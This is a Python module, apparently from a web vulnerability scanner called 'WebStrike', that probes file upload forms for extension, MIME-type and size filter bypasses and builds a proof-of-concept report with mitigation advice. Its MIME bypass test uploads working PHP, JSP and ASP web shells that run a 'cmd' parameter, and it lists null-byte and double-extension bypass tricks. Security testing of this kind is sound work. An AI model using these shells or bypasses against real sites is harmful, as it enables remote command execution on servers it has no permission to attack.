"""
File Upload Security Testing Module
"""
import os
import mimetypes
from typing import Dict, List, Optional
import requests
from ..utils import setup_logging

logger = setup_logging()

class FileUploadScanner:
    """File upload vulnerability scanner"""
    
    def __init__(self, session: requests.Session):
        self.session = session
        self.dangerous_extensions = [
            '.php', '.php3', '.php4', '.php5', '.phtml', '.phps',
            '.asp', '.aspx', '.jsp', '.jspx',
            '.exe', '.com', '.bat', '.cmd', '.scr',
            '.sh', '.bash', '.py', '.pl', '.rb',
            '.jar', '.war', '.ear'
        ]
        
        self.bypass_techniques = [
            # Double extensions
            '{original}.jpg',
            # Null byte injection
            '{original}%00.jpg',
            # Case variation
            '{original_upper}',
            # Alternative extensions
            '{name}.phar',
            '{name}.php5',
            '{name}.phtml',
            # MIME type confusion
            '{original}',  # Will be tested with different MIME types
        ]
    
    def scan_upload_form(self, form_data: Dict) -> Dict:
        """Scan file upload functionality for vulnerabilities"""
        vulnerabilities = []
        
        # Find file input fields
        file_inputs = self._find_file_inputs(form_data)
        
        if not file_inputs:
            return {
                'form_url': form_data['url'],
                'vulnerabilities': [],
                'vulnerability_count': 0,
                'reason': 'No file input fields found'
            }
        
        for file_input in file_inputs:
            field_name = file_input.get('name', '')
            logger.info(f"Testing file upload field: {field_name}")
            
            # Test various bypass techniques
            for technique in ['extension_bypass', 'mime_bypass', 'size_bypass']:
                vuln = self._test_upload_technique(form_data, field_name, technique)
                if vuln:
                    vulnerabilities.append(vuln)
        
        return {
            'form_url': form_data['url'],
            'file_inputs_found': len(file_inputs),
            'vulnerabilities': vulnerabilities,
            'vulnerability_count': len(vulnerabilities)
        }
    
    def _find_file_inputs(self, form_data: Dict) -> List[Dict]:
        """Find file input fields in the form"""
        file_inputs = []
        
        for input_field in form_data.get('inputs', []):
            if input_field.get('type', '').lower() == 'file':
                file_inputs.append(input_field)
        
        return file_inputs
    
    def _test_upload_technique(self, form_data: Dict, field_name: str, technique: str) -> Optional[Dict]:
        """Test specific upload bypass technique"""
        try:
            if technique == 'extension_bypass':
                return self._test_extension_bypass(form_data, field_name)
            elif technique == 'mime_bypass':
                return self._test_mime_bypass(form_data, field_name)
            elif technique == 'size_bypass':
                return self._test_size_bypass(form_data, field_name)
        except Exception as e:
            logger.error(f"Error testing {technique}: {str(e)}")
        
        return None
    
    def _test_extension_bypass(self, form_data: Dict, field_name: str) -> Optional[Dict]:
        """Test extension-based filter bypass"""
        # Create test files with dangerous extensions
        test_files = [
            ('test.php', '<?php echo "File upload bypass successful"; ?>', 'application/x-php'),
            ('test.jsp', '<% out.println("File upload bypass successful"); %>', 'application/x-jsp'),
            ('test.asp', '<% Response.Write("File upload bypass successful") %>', 'application/x-asp')
        ]
        
        for filename, content, mime_type in test_files:
            try:
                # Test direct upload
                result = self._attempt_upload(form_data, field_name, filename, content, mime_type)
                if result['uploaded']:
                    return {
                        'type': 'Dangerous File Upload',
                        'technique': 'Extension Bypass',
                        'filename': filename,
                        'evidence': f'Successfully uploaded {filename}',
                        'severity': 'Critical',
                        'confidence': 'High',
                        'upload_location': result.get('location', 'Unknown')
                    }
                
                # Test with bypass techniques
                for bypass in self.bypass_techniques:
                    if '{original}' in bypass:
                        bypass_filename = bypass.format(original=filename)
                    elif '{original_upper}' in bypass:
                        bypass_filename = bypass.format(original_upper=filename.upper())
                    elif '{name}' in bypass:
                        name = filename.split('.')[0]
                        bypass_filename = bypass.format(name=name)
                    else:
                        continue
                    
                    result = self._attempt_upload(form_data, field_name, bypass_filename, content, mime_type)
                    if result['uploaded']:
                        return {
                            'type': 'File Upload Filter Bypass',
                            'technique': f'Extension Bypass ({bypass})',
                            'filename': bypass_filename,
                            'evidence': f'Successfully uploaded {bypass_filename}',
                            'severity': 'Critical',
                            'confidence': 'High',
                            'upload_location': result.get('location', 'Unknown')
                        }
            
            except Exception as e:
                logger.error(f"Error testing extension bypass with {filename}: {str(e)}")
        
        return None
    
    def _test_mime_bypass(self, form_data: Dict, field_name: str) -> Optional[Dict]:
        """Test MIME type-based filter bypass"""
        # Test uploading dangerous content with safe MIME types
        test_cases = [
            ('malicious.php', '<?php system($_GET["cmd"]); ?>', 'image/jpeg'),
            ('shell.jsp', '<% Runtime.getRuntime().exec(request.getParameter("cmd")); %>', 'image/png'),
            ('backdoor.asp', '<% eval(request("cmd")) %>', 'image/gif')
        ]
        
        for filename, content, safe_mime in test_cases:
            try:
                result = self._attempt_upload(form_data, field_name, filename, content, safe_mime)
                if result['uploaded']:
                    return {
                        'type': 'MIME Type Filter Bypass',
                        'technique': 'MIME Type Spoofing',
                        'filename': filename,
                        'evidence': f'Uploaded {filename} with MIME type {safe_mime}',
                        'severity': 'High',
                        'confidence': 'High',
                        'upload_location': result.get('location', 'Unknown')
                    }
            except Exception as e:
                logger.error(f"Error testing MIME bypass with {filename}: {str(e)}")
        
        return None
    
    def _test_size_bypass(self, form_data: Dict, field_name: str) -> Optional[Dict]:
        """Test file size restrictions"""
        # Test with very large file
        large_content = 'A' * (10 * 1024 * 1024)  # 10MB
        
        try:
            result = self._attempt_upload(form_data, field_name, 'large_file.txt', large_content, 'text/plain')
            if result['uploaded']:
                return {
                    'type': 'File Size Restriction Bypass',
                    'technique': 'Large File Upload',
                    'filename': 'large_file.txt',
                    'evidence': f'Successfully uploaded {len(large_content)} bytes',
                    'severity': 'Medium',
                    'confidence': 'High',
                    'file_size': len(large_content)
                }
        except Exception as e:
            logger.error(f"Error testing size bypass: {str(e)}")
        
        return None
    
    def _attempt_upload(self, form_data: Dict, field_name: str, filename: str, content: str, mime_type: str) -> Dict:
        """Attempt to upload a file"""
        try:
            # Prepare form data
            from urllib.parse import urljoin
            
            form_url = form_data['url']
            action = form_data.get('action', '')
            method = form_data.get('method', 'post').lower()
            
            # Determine target URL
            if action:
                target_url = urljoin(form_url, action)
            else:
                target_url = form_url
            
            # Prepare multipart form data
            files = {field_name: (filename, content, mime_type)}
            
            # Add other form fields
            data = {}
            for input_field in form_data.get('inputs', []):
                input_name = input_field.get('name', '')
                input_type = input_field.get('type', '')
                input_value = input_field.get('value', '')
                
                if input_type not in ['file', 'submit'] and input_name:
                    data[input_name] = input_value
            
            # Attempt upload
            if method == 'post':
                response = self.session.post(target_url, files=files, data=data)
            else:
                # Some forms might use GET with file parameter (rare but possible)
                response = self.session.get(target_url, params=data)
            
            # Check if upload was successful
            upload_success = self._check_upload_success(response, filename)
            upload_location = self._extract_upload_location(response, filename)
            
            return {
                'uploaded': upload_success,
                'status_code': response.status_code,
                'location': upload_location,
                'response_text': response.text[:500]  # First 500 chars for analysis
            }
        
        except Exception as e:
            logger.error(f"Error attempting upload: {str(e)}")
            return {'uploaded': False, 'error': str(e)}
    
    def _check_upload_success(self, response: requests.Response, filename: str) -> bool:
        """Check if file upload was successful"""
        success_indicators = [
            'upload successful', 'file uploaded', 'upload complete',
            'successfully uploaded', 'file saved', filename.lower()
        ]
        
        response_text = response.text.lower()
        
        # Check for success messages
        for indicator in success_indicators:
            if indicator in response_text:
                return True
        
        # Check status code (2xx usually indicates success)
        if 200 <= response.status_code < 300:
            # Additional checks for success
            error_indicators = ['error', 'failed', 'invalid', 'denied', 'not allowed']
            has_error = any(error in response_text for error in error_indicators)
            
            if not has_error:
                return True
        
        return False
    
    def _extract_upload_location(self, response: requests.Response, filename: str) -> Optional[str]:
        """Try to extract the uploaded file location from response"""
        import re
        
        # Common patterns for file locations
        patterns = [
            rf'(?:href|src)=["\']([^"\']*{re.escape(filename)}[^"\']*)["\']',
            rf'(?:location|path|url):\s*["\']?([^"\']*{re.escape(filename)}[^"\']*)["\']?',
            rf'/(?:uploads?|files?|media)/[^"\']*{re.escape(filename)}[^"\']*'
        ]
        
        for pattern in patterns:
            match = re.search(pattern, response.text, re.IGNORECASE)
            if match:
                return match.group(1) if match.groups() else match.group(0)
        
        return None
    
    def generate_upload_poc(self, vulnerability: Dict) -> str:
        """Generate proof-of-concept for file upload vulnerability"""
        filename = vulnerability.get('filename', 'test.php')
        technique = vulnerability.get('technique', 'Unknown')
        
        poc_content = f"""
File Upload Vulnerability Proof of Concept
==========================================

Vulnerability Type: {vulnerability.get('type', 'Unknown')}
Technique Used: {technique}
Uploaded Filename: {filename}
Severity: {vulnerability.get('severity', 'Unknown')}

Test File Content:
------------------
"""
        
        if filename.endswith('.php'):
            poc_content += """<?php
echo "WebStrike File Upload Test - Vulnerability Confirmed";
phpinfo();
?>"""
        elif filename.endswith('.jsp'):
            poc_content += """<%
out.println("WebStrike File Upload Test - Vulnerability Confirmed");
%>"""
        elif filename.endswith('.asp'):
            poc_content += """<%
Response.Write("WebStrike File Upload Test - Vulnerability Confirmed")
%>"""
        else:
            poc_content += "WebStrike File Upload Test - Vulnerability Confirmed"
        
        poc_content += f"""

Recommended Mitigation:
----------------------
1. Implement strict file type validation
2. Use whitelist of allowed extensions
3. Validate file content, not just extension
4. Store uploaded files outside web root
5. Implement proper file size limits
6. Use virus scanning for uploaded files
7. Generate random filenames to prevent direct access
"""
        
        return poc_content
